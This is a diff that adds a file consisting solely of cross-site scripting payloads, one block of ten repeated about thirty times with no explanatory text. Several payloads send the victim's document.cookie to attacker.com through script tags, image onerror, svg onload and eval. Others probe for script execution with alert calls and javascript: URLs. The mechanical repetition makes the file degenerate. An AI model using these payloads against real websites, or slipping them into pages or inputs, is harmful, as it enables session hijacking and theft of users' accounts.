@@ -1,0 +1,329 @@
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
+
+<script>document.location='https://attacker.com/?cookie='+document.cookie</script>
+<img src="x" onerror="document.location='https://attacker.com/?cookie='+document.cookie">
+<script>eval('document.location="https://attacker.com/?cookie="+document.cookie')</script>
+<iframe src="javascript:alert(document.domain)"></iframe>
+<a href="javascript:alert(document.domain)">Click me</a>
+<svg onload="document.location='https://attacker.com/?cookie='+document.cookie"></svg>
+<script>window.location.href='https://attacker.com?cookie='+document.cookie</script>
+<input value="<img src='x' onerror='alert(1)'>">
+<svg><script>alert(1)</script></svg>
+<img src="x" onerror="alert('DOM XSS')">
